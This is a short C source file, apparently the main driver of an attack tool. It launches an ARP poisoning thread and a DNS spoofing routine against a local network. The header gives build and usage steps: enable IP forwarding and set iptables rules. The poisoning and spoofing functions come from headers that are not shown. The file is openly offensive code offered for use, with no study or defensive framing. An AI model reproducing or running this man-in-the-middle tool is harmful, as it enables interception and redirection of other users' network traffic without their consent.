
/**
 * Compile:
 * make
 * 
 * Usage:
 * echo 1 >> /proc/sys/net/ipv4/ip_forward
 * iptables -P FORWARD DROP
 * iptables -L -n -v
 * 
 * ./main
 */

#include "arp.h"
#include "config.h"

int main()
{
    pthread_t thread_id;

    struct config *conf = (struct config *)malloc(sizeof(struct config));
    getConfig(conf);

    fprintf(stdout, "\n------------------------------\n\n");
    fprintf(stdout, "Starting ARP Poisoning\n");
    // Create threads
    pthread_create(&thread_id, NULL, (void *)arp_poison, (void *)conf);

    fprintf(stdout, "Starting DNS Spoofing\n");
    // Do DNS Spoofing
    dns_sniff(conf);

    fprintf(stdout, "Done Sniffing\n");

    // Finish thread
    pthread_join(thread_id, NULL);

    return 0;
}